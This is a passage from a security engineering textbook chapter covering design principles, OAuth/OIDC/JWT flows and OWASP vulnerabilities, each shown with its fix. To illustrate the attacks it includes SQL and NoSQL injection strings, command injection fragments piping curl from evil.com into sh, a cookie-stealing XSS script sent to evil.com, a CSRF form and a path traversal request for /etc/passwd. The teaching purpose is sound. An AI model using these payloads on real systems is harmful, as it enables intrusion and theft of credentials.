<!--
  CHAPTER: 5
  TITLE: Security Engineering
  PART: I — Foundations
  PREREQS: None (standalone)
  KEY_TOPICS: security principles, OAuth/OIDC/JWT, OWASP Top 10, cryptography, infrastructure security, GDPR, SOC2
  DIFFICULTY: Intermediate
  UPDATED: 2026-03-24
-->

# Chapter 5: Security Engineering

> **Part I — Foundations** | Prerequisites: None (standalone) | Difficulty: Intermediate

Defense in depth for backend systems — authentication, authorization, common vulnerabilities, cryptographic primitives, and compliance frameworks.

### In This Chapter
- Security Principles
- Authentication & Authorization
- Application Security (OWASP Top 10)
- Cryptography for Engineers
- Infrastructure Security
- Compliance & Privacy

### Related Chapters
- **SECURITY spiral:** → [Ch 19: AWS Deep Dive](../part-4-cloud-operations/19-aws-deep-dive.md)
- [Ch 7: Infrastructure Security] — infrastructure security
- [Ch 19: AWS IAM & Security] — AWS IAM/security
- [Ch 15: CI/CD Security] — security in CI/CD

---

## Why Security Feels Different (And Why It Shouldn't)

Here's the uncomfortable truth about security: most breaches aren't sophisticated. They're not nation-state actors exploiting zero-days. They're an engineer who concatenated user input directly into a SQL query. They're a developer who hardcoded an AWS key in a public GitHub repo. They're a team that rotated their secrets manually and forgot about one microservice.

Security is not a feature you bolt on at the end. It's not the compliance checkbox you tick before launch. It's a mindset — a way of reading every line of code and asking "what happens if someone lies to me here?"

The breach stories in this chapter aren't cautionary tales meant to scare you. They're invitations to understand how smart engineers made predictable mistakes, so you can make different ones. (You'll make mistakes. Everyone does. The goal is to make novel ones, not repeat the classics.)

Let's start with the principles that cut across everything, then go deep on the mechanisms.

---

## 1. Security Principles

Before we get into OAuth flows and SQL injection payloads, we need to talk about the mental models that underpin every security decision you'll ever make. These aren't abstract philosophy — they're the rules that let you reason about security in situations you've never seen before.

### Defense in Depth

Imagine a medieval castle. There's a moat, then outer walls, then inner walls, then the keep, then the vault inside the keep. The designers didn't build the vault and call it a day. They assumed each layer would eventually fail and asked "what happens next?"

Your system should work the same way. Assume your WAF gets bypassed. Assume an attacker gets past your network perimeter. Assume a dependency has a zero-day. At each layer, ask: if this layer fails, what prevents catastrophe?

The SolarWinds attack in 2020 is the masterclass here. Attackers compromised the software build pipeline at SolarWinds — the outermost layer of the supply chain. But once their malicious code was inside customers' networks as a trusted update, those customers had no inner layers to catch it. The malware sat dormant for weeks, making normal-looking DNS requests, until it was ready to phone home. 18,000 organizations installed the backdoor. The blast radius was catastrophic precisely because once you were "inside," there was nothing left to stop you.

Defense in depth would have meant: network monitoring for unusual patterns even from trusted software, segmentation so the monitoring tool couldn't reach your crown jewels, anomaly detection on DNS traffic. Layers. Always layers.

### Least Privilege

Give every system, service, and user the minimum permissions they need to do their job — and only for as long as they need them.

Your API service doesn't need to be able to DROP TABLE. Your CI/CD pipeline doesn't need write access to production. Your data analytics job doesn't need to be able to create IAM users.

This sounds obvious. It is obvious. And yet the Equifax breach in 2017 — which exposed 147 million people's Social Security numbers, birthdates, and credit card numbers — happened partly because a single Apache Struts vulnerability gave attackers access to systems they could then pivot through, because internal services had far more network access to each other than they needed. One vulnerable endpoint was the key to the kingdom.

Least privilege is about blast radius. When something goes wrong — and it will — how much damage can it do? A compromised service with read-only access to one table does far less damage than a compromised service with admin access to your whole database.

In practice, this means:
- IAM roles scoped to specific resources and actions, not `*` wildcards
- Database users with exactly the permissions their application needs, no more
- Time-limited credentials that expire and must be re-requested
- Separate credentials per environment (dev, staging, prod)

We'll go much deeper on AWS IAM in [Ch 19: AWS IAM & Security], but the principle is universal.

### Zero Trust

The old security model was "castle and moat": protect the perimeter, trust everything inside. Once you were on the corporate network, you could access most internal services. VPNs extended this model to remote workers.

Zero trust throws this out. The network location tells you nothing. You can't trust a request just because it came from inside your VPC. You can't trust a service just because it's on your internal network.

Instead: every request must be authenticated and authorized. Every time. No implicit trust based on where the request came from.

This isn't paranoia — it's realism. Your internal network can be compromised. An attacker who gets a foothold in one microservice shouldn't be able to freely call all your other internal services just because they're "internal."

Zero trust in practice means:
- Service-to-service authentication (mutual TLS or service mesh with identity)
- Authorization checks on every API call, even internal ones
- Segmented networks where services can only talk to the services they need to
- Logging and monitoring of all traffic, including internal

### Security by Design

Security by design means security considerations are baked into the architecture from the start, not retrofitted afterward.

Here's the thing about retrofitting security: it's expensive, it's incomplete, and it usually produces the worst outcome — the illusion of security. You add authentication to an API that was never designed to be authenticated, and you get an authentication layer that can be bypassed in three different ways because the underlying assumptions of the codebase never accounted for untrusted callers.

When you're designing a new feature, the questions to ask before writing a single line of code:
- What data does this handle? How sensitive is it?
- Who should be able to call this? Under what conditions?
- What happens if an attacker controls the input?
- What's the worst-case outcome if this is exploited?
- How would I know if it's being exploited?

That last one is underrated. Detection is as important as prevention.

### Fail-Safe Defaults

Default to deny. Explicitly grant access.

Your authorization system should start from "no" and require explicit rules to reach "yes." If the authorization check fails, the request fails. If the authorization rules are ambiguous, the request fails. Access should never be granted by accident.

This is why the "broken access control" vulnerability (the #1 item on the OWASP Top 10) is so common: developers often write code that defaults to allowing access and then tries to filter out unauthorized users. Invert this. Write code that defaults to denying access and then explicitly allows authorized users.

### Complete Mediation

Every access to every resource must be checked every time.

Not "check on the first request and cache the result for 10 minutes." Not "check in the UI but skip the check in the API because it's 'internal.'" Every. Access. Every time.

This is where caching authorization decisions goes wrong. Your caching logic might not account for permission revocation. If you revoke a user's access, but the authorization decision is cached for 5 more minutes, they still have access for 5 more minutes. Sometimes that's acceptable. Sometimes (financial transactions, healthcare records) it absolutely isn't.

### Separation of Duties

No single person or system should have end-to-end control over a sensitive process.

The classic example: the person who can initiate a wire transfer shouldn't be the same person who approves it. In software: the engineer who writes the code shouldn't be the only person who reviews and deploys it. The system that can create admin accounts shouldn't be the same system that audits admin account usage.

This matters most in CI/CD and deployment pipelines. If a compromised CI/CD system can both modify code and deploy to production without any other gate, you have a separation of duties problem. (See [Ch 15: CI/CD Security] for the full story here.)

| Principle | Description |
|---|---|
| **Defense in Depth** | Multiple independent security layers. If one fails, others protect. |
| **Least Privilege** | Minimum permissions needed, minimum duration. |
| **Zero Trust** | Never trust, always verify. No implicit trust based on network location. |
| **Security by Design** | Build security in from the start, not bolted on after. |
| **Fail-Safe Defaults** | Default to denying access. Explicitly grant permissions. |
| **Complete Mediation** | Every access to every resource must be checked. |
| **Separation of Duties** | No single person/system should have end-to-end control. |

---

## 2. Authentication & Authorization

This is where things get interesting. Authentication ("who are you?") and authorization ("what are you allowed to do?") are different concepts that engineers often blur together — and that blurring creates vulnerabilities.

Let me walk you through the evolution of how web apps handle identity, because understanding why we ended up with OAuth 2.0 and JWTs makes them much easier to work with correctly.

### The Problem OAuth Solves (A Story)

It's 2007. You use a website called "PrintMyPhotos.com" that wants to access your Google Photos library to print them for you. How does it get access?

Option A: You give PrintMyPhotos your Google username and password. They log in as you, grab your photos, and print them. This is obviously terrible — you've handed your full Google credentials to a third party. If PrintMyPhotos gets breached, the attacker has your Google password. If you want to revoke PrintMyPhotos's access, you have to change your Google password, which affects everything else you use.

Option B: Google gives PrintMyPhotos a magic token that only allows read access to Google Photos, not your email, not your Drive, not your contacts. PrintMyPhotos never sees your password. If you want to revoke access, you tell Google to invalidate that specific token. PrintMyPhotos's breach leaks only the ability to read your (already public) photos.

Option B is OAuth. And the OAuth dance — the sequence of steps that gets you from "user wants to grant access" to "app has a token" — is one of those protocol designs that seems complicated until you understand what problem each step is solving.

### OAuth 2.0: The Authorization Code Flow (With PKCE)

Let's walk through the Authorization Code + PKCE flow as if it's a detective story, because the security comes from understanding who knows what and when.

**The Setup: You're using `MyApp.com`, which wants to access your GitHub repos.**

**Step 1: The user clicks "Connect GitHub"**

MyApp generates two values:
- A `code_verifier`: a random string (43-128 characters of URL-safe characters)
- A `code_challenge`: `BASE64URL(SHA256(code_verifier))`

MyApp sends the user to GitHub's authorization endpoint:

```
https://github.com/login/oauth/authorize
  ?client_id=myapp123
  &redirect_uri=https://myapp.com/callback
  &scope=repo:read
  &state=random-csrf-token
  &code_challenge=<hashed-verifier>
  &code_challenge_method=S256
```

The `state` parameter is a CSRF protection mechanism. MyApp stores it and will verify GitHub echoes it back unchanged. The `code_challenge` is what makes PKCE special — we'll come back to it.

**Step 2: GitHub asks the user "Should MyApp have read access to your repos?"**

The user clicks "Authorize." GitHub redirects the user back to MyApp:

```
https://myapp.com/callback
  ?code=short-lived-authorization-code
  &state=random-csrf-token
```

**Step 3: MyApp verifies the state and exchanges the code for tokens**

MyApp's backend (not the browser — this is important) sends a POST to GitHub:

```
POST https://github.com/login/oauth/access_token
  client_id=myapp123
  client_secret=SECRET
  code=short-lived-authorization-code
  redirect_uri=https://myapp.com/callback
  code_verifier=original-random-string
```

GitHub hashes the `code_verifier` and compares it to the `code_challenge` from step 1. If they match, GitHub knows this is the same client that initiated the flow. GitHub returns an access token.

**Why is PKCE there? What attack does it prevent?**

Without PKCE, an attacker who intercepts the authorization code (via a malicious redirect on a mobile app, for example) can exchange it for a token themselves. With PKCE, the code is useless without the `code_verifier`, which only the legitimate app knows. Even if the code is intercepted, the attacker can't use it.

This is the detective story part: every element of the OAuth flow exists to prevent a specific attack. The `state` prevents CSRF. The short-lived code prevents replay. The PKCE verifier prevents code interception. The backend token exchange prevents the access token from appearing in browser history.

**The two grant types you'll actually use:**

- **Authorization Code + PKCE:** For web apps and mobile apps where a user is involved. This is the standard. Always use PKCE.
- **Client Credentials:** For service-to-service calls. No user involved. Your service authenticates directly with the authorization server using its own credentials and gets a token. Think cron jobs, background workers, API-to-API calls.

Avoid the Implicit flow (deprecated, insecure) and Resource Owner Password Credentials (requires sharing the user's password, defeats the purpose of OAuth).

### "Login with Google": The Full Story

Let's trace exactly what happens when a user clicks "Login with Google" on a web application. Understanding this end-to-end saves hours of debugging auth issues and helps you spot misconfigurations instantly.

**The cast of characters:**
- **User** — the person clicking the button
- **Your App** — the relying party (RP) that wants to know who the user is
- **Google** — the identity provider (IdP) and authorization server

**Step 1: The user clicks the button (T+0ms)**

Your app generates two values in memory:
- `state`: a random 32-byte hex string (`a3f7b2c1...`), stored in the user's session
- `code_verifier`: a random 43-128 character URL-safe string, also stored in session

It computes `code_challenge = BASE64URL(SHA256(code_verifier))` and redirects the browser to:

```
https://accounts.google.com/o/oauth2/v2/auth
  ?client_id=482910-xyz.apps.googleusercontent.com
  &redirect_uri=https://yourapp.com/auth/callback
  &response_type=code
  &scope=openid email profile
  &state=a3f7b2c1...
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8UrAn8MuBKU=
  &code_challenge_method=S256
```

Note `scope=openid email profile` — the `openid` scope is what turns this from pure OAuth (authorization only) into OIDC (authentication + identity).

**Step 2: Google shows the consent screen (T+200ms)**

The browser lands on Google's login page. The user logs in (if not already) and sees "yourapp.com wants to access your name, email address, and profile picture." They click Allow.

**Step 3: Google redirects back with an authorization code (T+5s)**

Google sends the browser to:

```
https://yourapp.com/auth/callback
  ?code=4/0AX4XfWj9CQk2VzfVTp...
  &state=a3f7b2c1...
```

The `code` is a short-lived (usually 60-second) single-use token. It's worthless without the `code_verifier`.

**Step 4: Your server validates state and exchanges the code (T+5.1s)**

Your backend (the browser never sees this request) POSTs to Google:

```
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

code=4/0AX4XfWj9CQk2VzfVTp...
&client_id=482910-xyz.apps.googleusercontent.com
&client_secret=GOCSPX-xxxxx
&redirect_uri=https://yourapp.com/auth/callback
&grant_type=authorization_code
&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

Google hashes the `code_verifier`, compares it against the `code_challenge` from step 1, and — if they match — returns:

```json
{
  "access_token": "ya29.a0AfH6SMB...",
  "expires_in": 3599,
  "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",
  "scope": "openid email profile",
  "token_type": "Bearer"
}
```

**Step 5: Your app validates the ID token (T+5.2s)**

The `id_token` is a JWT. Your app verifies it cryptographically against Google's published public keys (available at `https://www.googleapis.com/oauth2/v3/certs`). After validation, you can trust the claims inside.

**Step 6: You establish your own session (T+5.3s)**

You look up (or create) the user in your database using `sub` (the stable Google user ID that never changes, even if they change their email). You set an `httpOnly`, `Secure`, `SameSite=Lax` session cookie and redirect to the dashboard.

The browser never saw Google's `access_token`. The backend never stored the `code_verifier` anywhere permanent. The user is now logged in.

The whole flow completes in under 6 seconds from button click to authenticated dashboard. Every step has a specific security purpose. If you skip `state` validation you're open to CSRF. If you skip PKCE you're open to code interception. If you skip ID token signature verification you can be fed forged tokens. The protocol is designed so each step is necessary.

### OIDC: Adding Identity on Top of OAuth

OAuth 2.0 is about authorization — granting access to resources. It says nothing about identity. If GitHub gives MyApp an access token, MyApp can use it to call GitHub's API, but it has no idea who the user is.

OpenID Connect (OIDC) adds an **ID token** to the OAuth response. The ID token is a JWT (more on those in a moment) that contains claims about the user's identity: their subject identifier, email, name, when they authenticated.

```json
{
  "sub": "github|12345678",
  "email": "alice@example.com",
  "name": "Alice Chen",
  "iss": "https://github.com",
  "aud": "myapp123",
  "iat": 1711234567,
  "exp": 1711238167
}
```

OIDC is what makes "Sign in with Google" work. You're not just authorizing Google to share data — you're using Google as an identity provider. Your app gets a cryptographically signed statement that says "I, Google, assert that the person who just authenticated is alice@example.com."

This is powerful because your app doesn't have to manage passwords. Google (or GitHub, or Auth0, or your corporate SSO) handles that complexity. Your app just verifies the JWT.

### JWT: The Token That Explains Itself

A JSON Web Token is a compact, URL-safe way to represent claims between two parties. The "moment it clicks" for JWTs is this: a JWT doesn't need to be validated against a database. It's self-contained. The signature proves it wasn't tampered with.

A JWT looks like this:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InByb2QtMjAyNS0wMSJ9
.eyJzdWIiOiJ1c2VyXzEyMzQ1IiwiZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSIsIm5hbWUiOiJBbGljZSBDaGVuIiwicm9sZSI6ImFkbWluIiwib3JnX2lkIjoib3JnX2FiY2QxMjM0IiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmV4YW1wbGUuY29tIiwiYXVkIjoiaHR0cHM6Ly9hcGkuZXhhbXBsZS5jb20iLCJpYXQiOjE3NDM2MDAwMDAsImV4cCI6MTc0MzYwMDkwMH0
.Rk9vb2JhckJhekJhckZvb2Jhck9vYmFyQmF6QmFyRm9vYmFyT29iYXI
```

Three base64-encoded segments separated by dots. Let's decode each one:

**Segment 1 — Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "prod-2025-01"
}
```

- `alg`: The signing algorithm. `RS256` means RSA with SHA-256. This is asymmetric — signed with a private key, verified with the public key.
- `kid`: Key ID. When issuers rotate signing keys (which they do), `kid` tells the verifier which public key to use. Your library fetches the JWKS (JSON Web Key Set) endpoint and finds the key with this ID.

**Segment 2 — Payload (the claims):**
```json
{
  "sub": "user_12345",
  "email": "alice@example.com",
  "name": "Alice Chen",
  "role": "admin",
  "org_id": "org_abcd1234",
  "iss": "https://auth.example.com",
  "aud": "https://api.example.com",
  "iat": 1743600000,
  "exp": 1743600900
}
```

Reading each field:
- `sub` (subject): The stable identifier for this user. This is what you store in your database as the foreign key. It never changes even if Alice changes her email.
- `email`, `name`: Profile claims. Convenient, but treat them as hints — verify them through your own database if they're security-sensitive.
- `role`: An application-specific custom claim. You added this. It's not part of the JWT spec.
- `org_id`: Another custom claim. Useful for multi-tenant apps to know which organization this user belongs to.
- `iss` (issuer): Who issued this token. Your verification code must check this matches what you expect.
- `aud` (audience): Who this token is intended for. Your API must check this matches itself. A token issued for `api.example.com` should be rejected by `admin.example.com`.
- `iat` (issued at): Unix timestamp when the token was created. `1743600000` = 2025-04-02 12:00:00 UTC.
- `exp` (expiration): Unix timestamp after which the token is invalid. `1743600900` = 15 minutes after `iat`. Always verify this is in the future.

**Segment 3 — Signature:**

The raw bytes of `RSASHA256(base64url(header) + "." + base64url(payload))`. You cannot verify this without the issuer's public key. You cannot forge this without the issuer's private key.

**The critical thing to understand:** segments 1 and 2 are just base64-encoded. Anyone can decode and read them. Run this in your browser console:

```javascript
atob('eyJzdWIiOiJ1c2VyXzEyMzQ1Iiw...')
// Returns the JSON payload as a string
```

This is why you must never put sensitive data in JWT claims. No passwords, SSNs, credit card numbers, internal system details, pricing rules you don't want customers to see. Treat the payload as publicly readable — because it is.

When your API receives a JWT, it:
1. Verifies the signature using the public key of the issuer
2. Checks that `exp` (expiration) is in the future
3. Checks that `iss` (issuer) is who you expect
4. Checks that `aud` (audience) is your service
5. Reads the claims and makes authorization decisions

No database lookup. No session lookup. The token is self-describing. This is why JWTs are popular in distributed systems — a microservice can validate a JWT without calling back to an auth service.

**The gotchas that will burn you:**

- **JWTs are base64-encoded, not encrypted.** Anyone who gets the token can read the payload. Don't put sensitive data (SSNs, credit card numbers, internal system details) in JWT claims. Put a user ID. Put a role. That's it.

- **JWTs can't be revoked natively.** This is the fundamental tension. If you issue a JWT valid for 24 hours and then the user gets their account banned, the JWT is still valid for up to 24 hours. You need a deny-list (typically Redis with a TTL matching the token's expiry) for critical revocations like account suspension or password change.

- **Keep access tokens short-lived.** 15 minutes is the standard. Use refresh tokens (longer-lived, stored server-side or in httpOnly cookies) to get new access tokens. Rotate refresh tokens on use — each use of a refresh token should invalidate the old one and issue a new one. This way you detect token theft: if an attacker uses a stolen refresh token, the legitimate user's next refresh will fail (their token was already used), which should trigger a security alert.

- **Validate the `alg` field.** There's a classic attack where you change the algorithm in the JWT header from `RS256` (asymmetric) to `none`, and some buggy libraries accept the token without any signature. Always explicitly specify and verify the expected algorithm. Never trust the algorithm specified in the token header.

### Session Management: When You Don't Want Stateless

JWTs are stateless, which is great for scalability and bad for immediate revocation. For security-critical applications — banking, healthcare, admin panels — you might prefer server-side sessions.

Server-side sessions store state on the server (usually Redis) and give the client an opaque session ID in a cookie. When you revoke a session, you delete it from Redis. Immediately. Done.

Cookie security attributes you must get right:
- `HttpOnly`: The cookie cannot be accessed by JavaScript. This prevents XSS from stealing the session cookie.
- `Secure`: The cookie is only sent over HTTPS. This prevents network sniffing.
- `SameSite=Strict` (or `Lax` for most apps): The cookie is not sent on cross-site requests. This prevents CSRF attacks.

Implement both idle timeouts (inactivity for X minutes expires the session) and absolute timeouts (sessions can't live forever, no matter how active the user is). Absolute timeouts force re-authentication, which is annoying but important for high-security contexts.

### Authorization Models: Choosing the Right One

Authentication answers "who are you?" Authorization answers "what can you do?" You need both, separately, and you need to pick the right model for your use case.

| Model | Description | Use When |
|---|---|---|
| **RBAC** | Role-Based. Users → Roles → Permissions | Simple hierarchies, admin/user/guest distinctions |
| **ABAC** | Attribute-Based. Policies on user/resource/environment attributes | Fine-grained, dynamic policies (time-of-day, location, data classification) |
| **ReBAC** | Relationship-Based. Permissions based on object relationships | Collaborative apps where access follows document ownership (Google Docs model) |

**RBAC** is the starting point for most applications. Users have roles. Roles have permissions. If Alice is an `admin`, she can `DELETE /posts/:id`. If Bob is a `viewer`, he can only `GET /posts/:id`. Simple, easy to reason about, easy to audit.

RBAC breaks down when permissions become context-dependent. Can Alice delete *any* post, or only posts she created? Can Bob view *any* document, or only documents shared with him? Once you're asking these questions, you've left RBAC territory.

**ABAC** answers context-dependent questions with policy rules:

```
ALLOW IF user.department == resource.department
  AND user.clearanceLevel >= resource.classificationLevel
  AND request.time BETWEEN 09:00 AND 17:00
```

Powerful, but ABAC policies get complex fast. The debugging experience is painful — "why can't Alice access this?" requires tracing through policy rules.

**ReBAC** is the model Google Zanzibar uses (and it powers Google Drive, Google Docs, Google Calendar, and more). Permissions are derived from the relationship graph between users and resources. "Alice can edit this doc because Alice is an editor of this doc. Bob can view this doc because Bob is in the group that has viewer access to this folder that contains this doc."

ReBAC elegantly handles inheritance and delegation. It's the right model for collaborative apps. For everything else, start with RBAC.

**The cardinal sin of authorization:** checking authorization client-side only. Your React component hides the "Delete" button from non-admins. Great. But if your API doesn't also check that the caller is an admin, any user with browser dev tools can call `DELETE /posts/123` directly and it'll work. Always enforce authorization server-side. The UI is just UX — not security.

### Passkeys and WebAuthn: The Future of Authentication

Passwords are fundamentally broken. People reuse them, forget them, write them on sticky notes. Phishing steals them. Credential stuffing attacks exploit the fact that if your password for one site is compromised, attackers will try it on every other site.

Passkeys (built on WebAuthn) solve this with public key cryptography. When you register a passkey:
1. Your device generates a public/private key pair
2. The private key never leaves your device (stored in the secure enclave on iOS/macOS, Windows Hello, or a hardware key)
3. The server stores only your public key

When you authenticate:
1. The server sends a challenge
2. Your device signs the challenge with the private key (after you verify with biometrics/PIN)
3. The server verifies the signature with the stored public key

The private key never travels. There's nothing to phish (passkeys are bound to the specific domain, so a fake `g00gle.com` can't use your `google.com` passkey). There's nothing to credential-stuff (there's no shared secret to steal). There's nothing to reuse across sites (each passkey is unique per site).

The adoption curve is still ramping, but if you're building a new authentication system today, design it to support WebAuthn. The FIDO Alliance's spec is solid, libraries exist for every major platform, and Apple/Google/Microsoft have built passkey sync across their ecosystems. This is where authentication is going.

---

## 3. Application Security (OWASP Top 10)

The OWASP Top 10 is the security equivalent of the list of the most common mistakes developers make. It's not exhaustive, and it's not theoretical — it's empirical. These are the vulnerabilities actually found in production applications, ranked by prevalence and impact.

Let's go through each category with real attack scenarios, because understanding the attack is the fastest path to understanding the defense.

### Injection: The Classic That Never Dies

It's 1998. A developer somewhere writes:

```python
query = "SELECT * FROM users WHERE email = '" + email + "'"
```

A user submits the email: `alice@example.com' OR '1'='1`

The query becomes:

```sql
SELECT * FROM users WHERE email = 'alice@example.com' OR '1'='1'
```

`'1'='1'` is always true. The query returns all users. The attacker has bypassed authentication and can now see every account in your database.

This is SQL injection, and it's been on every OWASP Top 10 list since OWASP started publishing in 2003. It's still #3 as of the 2021 list. Because developers still do this.

A more advanced payload: `alice@example.com'; DROP TABLE users; --`

Now the query destroys your users table. This is not hypothetical — it's how Bobby Tables (the famous XKCD comic) became an internet meme.

**The fix is boring but absolute: parameterized queries.**

```python
# NEVER do this — user input becomes part of the SQL:
cursor.execute("SELECT * FROM users WHERE email = '" + email + "'")

# Always do this — parameters are passed separately, treated as data:
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

In a parameterized query, the database engine receives the query structure and the parameters separately. The parameters are treated as literal data, never as SQL to be executed. It's impossible for user input to change the query structure.

With ORMs, you get parameterization automatically for standard queries:

```python
# Django ORM - safe by default
User.objects.filter(email=email)

# But raw query strings with f-strings are still dangerous:
# BAD:  User.objects.raw(f"... WHERE email = '{email}'")
# GOOD: User.objects.raw("... WHERE email = %s", [email])
```

**NoSQL doesn't make you immune.** MongoDB has its own injection flavor. If your API accepts JSON and passes it directly to a query:

```javascript
// Attacker sends: { "email": { "$ne": null } }
// Your server does: db.users.findOne({ email: req.body.email })
// Result: matches the first user in the DB — authentication bypassed

// Fix: validate that email is a string, not an object
if (typeof req.body.email !== 'string') return res.status(400).send('Invalid');
```

**Command injection** is even more dangerous. The classic mistake: calling a shell command with user-supplied input. If user input isn't sanitized, an attacker can append `; rm -rf /` or `| curl evil.com | sh` to the input and your server executes it.

The fix: never pass user input to shell commands at all. Use language-native APIs instead. In Python, `subprocess.run(["convert", filename, "output.png"])` — passing a list of arguments — never invokes a shell and can't be injected. In Node.js, use `child_process.execFile` instead of `exec`. The API difference that prevents shell injection.

### XSS: When Your Website Attacks Your Users

Stored XSS is the attack that keeps giving. The setup: you're building a comment system. A user submits this as a comment:

```html
Great post! <script>
  document.location = 'https://evil.com/steal?c=' + document.cookie
</script>
```

If your app saves this to the database and renders it without escaping, every user who views that page has their session cookie stolen. The attacker posted the payload once and it runs for every future visitor. The attacker isn't even online anymore.

In 2018, British Airways suffered an XSS attack that resulted in 380,000 payment card details being stolen. The attackers injected malicious JavaScript into the booking page that sent credit card data entered by customers directly to the attacker's server. 15 lines of code. £183 million fine. Reputational damage that's still talked about today.

**The mental model for XSS defense: you control the rendering context.**

- Rendering in HTML context? HTML-encode: `<` becomes `&lt;`, `>` becomes `&gt;`
- Rendering in a JavaScript string context? JavaScript-encode
- Rendering in a URL context? URL-encode
- Rendering in a CSS context? CSS-encode

Modern frontend frameworks (React, Vue, Angular) do HTML encoding by default when you render `{content}` or `{{ content }}`. The dangerous escape hatches — React's raw HTML prop, Vue's `v-html`, Angular's `[innerHTML]` — write raw HTML to the DOM and bypass this protection entirely. Never use them with user-controlled data. If you genuinely need to render rich user content, run it through a dedicated HTML sanitizer library like DOMPurify first.

**Content Security Policy (CSP)** is your second line of defense. CSP is an HTTP header that tells browsers what scripts are allowed to run:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'
```

This policy says: only load scripts from the same origin or `cdn.example.com`, never from inline script tags, never from `<object>` elements. An attacker who manages to inject a script tag will find the browser refuses to execute it because it violates the CSP.

Start with `Content-Security-Policy: default-src 'self'` and relax from there. Use `report-uri` to get reports of CSP violations (including real attacks) without blocking yet.

**DOM-based XSS** happens entirely in the browser. Your JavaScript reads data from `location.hash` or `document.referrer` and writes it to the page using a raw DOM property that interprets the value as HTML rather than as text. An attacker crafts a URL with a script tag in the hash — your code writes the hash into the page as HTML, and the browser executes it.

The fix: use `.textContent` rather than `.innerHTML` or equivalent raw HTML setters when inserting text. `textContent` treats the value as literal characters, so injected tags are displayed on screen rather than executed as HTML.

### CSRF: Making Users Do Things They Didn't Intend

CSRF (Cross-Site Request Forgery) exploits the fact that browsers automatically include cookies with requests. If you're logged into your bank and you visit `evil.com`, and `evil.com` has this on it:

```html
<form action="https://yourbank.com/transfer" method="POST" id="form">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('form').submit()</script>
```

Your browser submits that form to your bank. With your session cookie. The bank thinks it's you. The transfer goes through.

The defense has two main variants:

**Synchronizer Token Pattern (stateful):** Your server generates a random CSRF token and embeds it in every form as a hidden field. It also stores the token in the session. When the form is submitted, it checks that the token in the form matches the token in the session. `evil.com` can't include a valid CSRF token because it can't read your session.

**SameSite Cookie Attribute (simpler but slightly weaker):** Setting `SameSite=Strict` on your session cookie means the browser won't send it on cross-site requests. `evil.com`'s form submission won't include your bank's cookie, so the bank sees an unauthenticated request. Use `SameSite=Lax` if you need to support navigating to your site via links from other sites (like clicking a link in an email).

Modern frameworks handle CSRF protection automatically. Django generates CSRF tokens for every form. Rails does the same. If you're writing a custom API, use `SameSite` cookies + verify the `Origin` header on state-changing requests.

### Insecure Deserialization: Turning Data Into Code

Your API accepts a serialized object from the client — maybe a pickled Python object, a Java serialized object, or a YAML payload. The assumption: the client sends valid data. The attack: the client sends crafted data that, when deserialized, executes arbitrary code on the server.

The dangerous pattern is using a serialization format that can execute code during deserialization and running it on untrusted input. Python's `pickle` module is the textbook example — `pickle.loads()` can execute arbitrary Python code embedded in the payload. If a server endpoint accepts user-supplied data and deserializes it with `pickle`, an attacker can craft a malicious payload whose `__reduce__` method calls `os.system()` or `subprocess.run()` with any shell command. Remote code execution from a settings field.

The safe alternative:

```python
# SAFE: use structured JSON with explicit schema validation
from pydantic import BaseModel
from typing import Literal

class UserPreferences(BaseModel):
    theme: Literal['light', 'dark', 'system']
    notifications_enabled: bool
    timezone: str

@app.route('/api/load-preferences', methods=['POST'])
def load_preferences():
    try:
        prefs = UserPreferences(**request.json['prefs'])
    except Exception:
        return jsonify({'error': 'Invalid preferences'}), 400
    return jsonify(prefs.dict())
```

The fix is structural: use a format that cannot embed executable code (JSON), and validate against an explicit schema (Pydantic, JSON Schema, protobuf) before touching the data. The schema defines exactly what fields and types are permitted — anything outside that shape is rejected.

Rules:
- Never deserialize Java serialized objects, PHP `unserialize()`, or any binary format from untrusted input without extensive hardening
- For structured data: JSON + explicit schema validation
- YAML deserializers have the same risk — use `yaml.safe_load()` not `yaml.load()` in Python (the safe variant restricts to basic data types and cannot instantiate arbitrary objects)
- For complex object graphs, define a protobuf or JSON Schema and validate before use

### Path Traversal: Escaping the Intended Directory

Your application serves files from a directory. The path comes from user input. An attacker includes `../` sequences to escape the intended directory and read files from anywhere on the filesystem.

```python
# VULNERABLE: naively joining user-supplied path
import os

BASE_DIR = '/var/app/uploads'

@app.route('/files/<filename>')
@login_required
def serve_file(filename):
    file_path = os.path.join(BASE_DIR, filename)
    return send_file(file_path)  # What if filename is "../../etc/passwd"?
```

Request: `GET /files/../../etc/passwd`

`os.path.join('/var/app/uploads', '../../etc/passwd')` resolves to `/etc/passwd`. The server returns the system's password file. In a containerized environment with secrets mounted at predictable paths (`/run/secrets/db_password`, `/var/run/secrets/kubernetes.io/serviceaccount/token`), this is worse — the attacker gets live credentials.

```python
# SAFE: canonicalize and verify the resolved path stays within BASE_DIR
import os

BASE_DIR = os.path.realpath('/var/app/uploads')

@app.route('/files/<filename>')
@login_required
def serve_file(filename):
    # Resolve symlinks and normalize the path completely
    requested_path = os.path.realpath(os.path.join(BASE_DIR, filename))

    # Verify it's still inside the intended directory
    if not requested_path.startswith(BASE_DIR + os.sep):
        return jsonify({'error': 'Access denied'}), 403

    if not os.path.isfile(requested_path):
        return jsonify({'error': 'Not found'}), 404

    return send_file(requested_path)
```

`os.path.realpath()` resolves all symlinks and `../` sequences to an absolute canonical path. The prefix check ensures the resolved path is inside `BASE_DIR`. Even if `filename` is `../../../etc/passwd`, `realpath()` resolves it to `/etc/passwd`, which does not start with `/var/app/uploads/`, and the request is rejected.

The same pattern applies in Node.js (`path.resolve()` + startsWith check), Go (`filepath.Clean()` + prefix check), and every other language. Always canonicalize, always verify the prefix.

### Mass Assignment: When the ORM Does Too Much

Mass assignment is the vulnerability where your code blindly assigns user-supplied JSON fields to a model object, including fields the user was never meant to control.

```javascript
// VULNERABLE: directly assigning all request body fields to the model
app.put('/api/users/:id', authenticate, async (req, res) => {
